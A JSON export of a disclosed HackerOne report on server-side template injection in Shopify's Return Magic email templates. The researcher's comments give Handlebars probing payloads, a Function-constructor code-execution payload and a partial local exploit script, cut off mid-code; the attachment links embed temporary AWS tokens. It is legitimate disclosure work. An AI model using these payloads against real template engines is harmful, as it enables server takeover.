{"id":423541,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MjM1NDE=","url":"https://hackerone.com/reports/423541","title":"H1514 Server Side Template Injection in Return Magic email templates?","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2018-10-13T22:34:15.431Z","submitted_at":"2018-10-13T22:34:15.431Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"zombiehelp54","url":"/zombiehelp54","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-04-04T17:35:23.641Z","bug_reporter_agreed_on_going_public_at":"2019-04-04T17:35:23.545Z","team_member_agreed_on_going_public_at":"2019-04-04T15:33:49.606Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:**\nPossible template injection in return magic email templates.\n\n**Description:** \nI've been playing with return magic workflow email templates and there seems to be some kinda of template injection but I am not sure if it's exploitable or even valid.\nHere is why I think it could be vulnerable: \nI set the email template to the following and then test the template and then the results go to my gmail inbox.\n`{{ this }} ` -\u003e `[Object Object]` \n`{{ this.__proto__ }}` --\u003e `[Object Object]`\n`{{ this.__proto__.constructor.name }}` --\u003e `Object`\nI couldn't go further but it seems like the backend is NodeJs.\n\n## Steps To Reproduce:\n\n1. Install Return Magic app\n2. Navigate to `https://\u003cshop\u003e.myshopify.com/admin/apps/returnmagic`\n3. Open Settings tab from the top menu and then open **Emails** --\u003e **Workflow** from the left menu\n4. Click Edit for any email template then at the editor click the code icon and enter `{{this}}` \n5. Go back to **Workflow** page and click **Send me a test email** for the template you edited then enter your email and check your inbox.\n6. You'll see `[Object Object]`\n\n## Supporting Material/References:\n{F360290}\n\n{F360291}\n\n## Impact\n\nCould be a Server Side template injection that can be used to take over the server ¯\\_(ツ)_/¯","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e\u003cbr\u003e\nPossible template injection in return magic email templates.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e \u003cbr\u003e\nI\u0026#39;ve been playing with return magic workflow email templates and there seems to be some kinda of template injection but I am not sure if it\u0026#39;s exploitable or even valid.\u003cbr\u003e\nHere is why I think it could be vulnerable: \u003cbr\u003e\nI set the email template to the following and then test the template and then the results go to my gmail inbox.\u003cbr\u003e\n\u003ccode\u003e{{ this }}\u003c/code\u003e -\u0026gt; \u003ccode\u003e[Object Object]\u003c/code\u003e \u003cbr\u003e\n\u003ccode\u003e{{ this.__proto__ }}\u003c/code\u003e --\u0026gt; \u003ccode\u003e[Object Object]\u003c/code\u003e\u003cbr\u003e\n\u003ccode\u003e{{ this.__proto__.constructor.name }}\u003c/code\u003e --\u0026gt; \u003ccode\u003eObject\u003c/code\u003e\u003cbr\u003e\nI couldn\u0026#39;t go further but it seems like the backend is NodeJs.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eInstall Return Magic app\u003c/li\u003e\n\u003cli\u003eNavigate to \u003ccode\u003ehttps://\u0026lt;shop\u0026gt;.myshopify.com/admin/apps/returnmagic\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eOpen Settings tab from the top menu and then open \u003cstrong\u003eEmails\u003c/strong\u003e --\u0026gt; \u003cstrong\u003eWorkflow\u003c/strong\u003e from the left menu\u003c/li\u003e\n\u003cli\u003eClick Edit for any email template then at the editor click the code icon and enter \u003ccode\u003e{{this}}\u003c/code\u003e \u003c/li\u003e\n\u003cli\u003eGo back to \u003cstrong\u003eWorkflow\u003c/strong\u003e page and click \u003cstrong\u003eSend me a test email\u003c/strong\u003e for the template you edited then enter your email and check your inbox.\u003c/li\u003e\n\u003cli\u003eYou\u0026#39;ll see \u003ccode\u003e[Object Object]\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2018-10-14_at_12.31.43_AM.jpg\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/360/290/d2e2704c189a4e8fe631e37b3f3bea50ab6cde85/Screen_Shot_2018-10-14_at_12.31.43_AM.jpg?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-10-14_at_12.31.43_AM.jpg%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-10-14_at_12.31.43_AM.jpg\u0026amp;response-content-type=image%2Fjpeg\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055611Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=25614c7a7dc9762abca2a004f571492a9aaad718a4762fb506a159f8b00d0e8a\" data-attachment-type=\"image/jpeg\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/360/290/d2e2704c189a4e8fe631e37b3f3bea50ab6cde85/Screen_Shot_2018-10-14_at_12.31.43_AM.jpg?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-10-14_at_12.31.43_AM.jpg%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-10-14_at_12.31.43_AM.jpg\u0026amp;response-content-type=image%2Fjpeg\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055611Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=25614c7a7dc9762abca2a004f571492a9aaad718a4762fb506a159f8b00d0e8a\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2018-10-14_at_12.31.49_AM.jpg\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/360/291/a0a643c7d8896ee987e8e762c33073e112d588f9/Screen_Shot_2018-10-14_at_12.31.49_AM.jpg?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-10-14_at_12.31.49_AM.jpg%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-10-14_at_12.31.49_AM.jpg\u0026amp;response-content-type=image%2Fjpeg\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055611Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=0e03cf2a3604c97d030512e0e713dfefad541c04c05a27dd98f2183f339d07be\" data-attachment-type=\"image/jpeg\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/360/291/a0a643c7d8896ee987e8e762c33073e112d588f9/Screen_Shot_2018-10-14_at_12.31.49_AM.jpg?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-10-14_at_12.31.49_AM.jpg%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-10-14_at_12.31.49_AM.jpg\u0026amp;response-content-type=image%2Fjpeg\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055611Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=0e03cf2a3604c97d030512e0e713dfefad541c04c05a27dd98f2183f339d07be\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eCould be a Server Side template injection that can be used to take over the server ¯_(ツ)_/¯\u003c/p\u003e\n","bounty_amount":"10000.0","formatted_bounty":"$10,000","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":360290,"file_name":"Screen_Shot_2018-10-14_at_12.31.43_AM.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/360/290/d2e2704c189a4e8fe631e37b3f3bea50ab6cde85/Screen_Shot_2018-10-14_at_12.31.43_AM.jpg?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-10-14_at_12.31.43_AM.jpg%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-10-14_at_12.31.43_AM.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055611Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026X-Amz-Signature=25614c7a7dc9762abca2a004f571492a9aaad718a4762fb506a159f8b00d0e8a","file_size":424781,"type":"image/jpeg"},{"id":360291,"file_name":"Screen_Shot_2018-10-14_at_12.31.49_AM.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/360/291/a0a643c7d8896ee987e8e762c33073e112d588f9/Screen_Shot_2018-10-14_at_12.31.49_AM.jpg?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-10-14_at_12.31.49_AM.jpg%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-10-14_at_12.31.49_AM.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055611Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026X-Amz-Signature=0e03cf2a3604c97d030512e0e713dfefad541c04c05a27dd98f2183f339d07be","file_size":455460,"type":"image/jpeg"}],"allow_singular_disclosure_at":null,"vote_count":382,"voters":["0xcaptainfreak","nytr0gen","checkm50","sultancad","hipotermia","bulbu1play3r","cache-money","sombrasec","kapytein","hunter","and 372 more..."],"structured_scope":{"databaseId":37198,"asset_type":"OTHER","asset_identifier":"Shopify Developed Apps","max_severity":"medium"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3494467,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-17T18:29:28.635Z","updated_at":"2018-10-17T18:29:28.635Z","additional_data":{"old_title":"[almostbug] - Server Side Template Injection in Return Magic email templates?","new_title":"[almostbugs] - Server Side Template Injection in Return Magic email templates?"},"actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3799493,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\nSo I have been playing with this a little bit recently. I read about JavaScript sandbox bypasses and figured that I have to access the Function constructor. Turns out that I can actually access it, because I tried `{{this.constructor.constructor}}` which returned `function anonymous() { }`. \n\nSo in order to get RCE, I would have to do something like `{{this.constructor.constructor('process.pid')()}}` but I can't use parentheses as the template returns an error if I use parentheses anywhere.\n\nSo I would've to figure out how to pass parameters to the function without parentheses so it might help if I knew what the template engine in the backend is.\n\nThanks!","markdown_message":"\u003cp\u003eHi,\u003cbr\u003e\nSo I have been playing with this a little bit recently. I read about JavaScript sandbox bypasses and figured that I have to access the Function constructor. Turns out that I can actually access it, because I tried \u003ccode\u003e{{this.constructor.constructor}}\u003c/code\u003e which returned \u003ccode\u003efunction anonymous() { }\u003c/code\u003e. \u003c/p\u003e\n\n\u003cp\u003eSo in order to get RCE, I would have to do something like \u003ccode\u003e{{this.constructor.constructor(\u0026#39;process.pid\u0026#39;)()}}\u003c/code\u003e but I can\u0026#39;t use parentheses as the template returns an error if I use parentheses anywhere.\u003c/p\u003e\n\n\u003cp\u003eSo I would\u0026#39;ve to figure out how to pass parameters to the function without parentheses so it might help if I knew what the template engine in the backend is.\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-10T17:05:23.166Z","updated_at":"2018-12-10T17:05:23.166Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3830772,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\nI have found out that the template engine is handlebars. \nHandlebars is supposed to be a logic-less template built on top of mustache, however, I have found a way to call any function within the scope (even the Function constructor). \n\nThe only problem I am facing right now is that whenever a function is called within the template, the template compiler sends the current scope (this) as the last parameter. \n\nFor example if I try to call something like `constructor.constructor(\"test\",\"test\")`, the compiler will call it like `constructor.constructor(\"test\", this)` and since `this` will be converted to a string then the anonymous function created will be: \n```\nfunction anonymous(test,test){\n[object Object]\n} \n```\nwhich will cause an error.\n\nSo I came up with an idea to overwrite the `Object.prototype.toString` function using `Object.defineProperty` so that it calls a function that returns a user controlled string.\n\nAnd since I can't define functions using the template. All I have to do is to find a function that is already defined within the template scope and returns a user controlled input. For example, a function like this:\n\n```\nfunction getStoreName(){\nreturn storeName;\n}\n```\n\nHere is how my local testing for this looks like:\n\ntest.js:\n```\nvar handlebars = require('handlebars'),\n  fs = require('fs');\n// StoreName is a user controlled input. The user can change his storename to whatever he wants\nvar storeName = \"console.log(process.pid)\"\nfunction getStoreName(){\n  return storeName;\n}\n\nvar data = {\n  getStoreName: getStoreName\n}\n\nfs.readFile('handlebars-example.html', 'utf-8', function(error, source){\n  handlebars.registerHelper('custom_title', function(title, nop){\n  console.log(title);\n  })\n\n  var template = handlebars.compile(source);\n  var html = template(data);\n  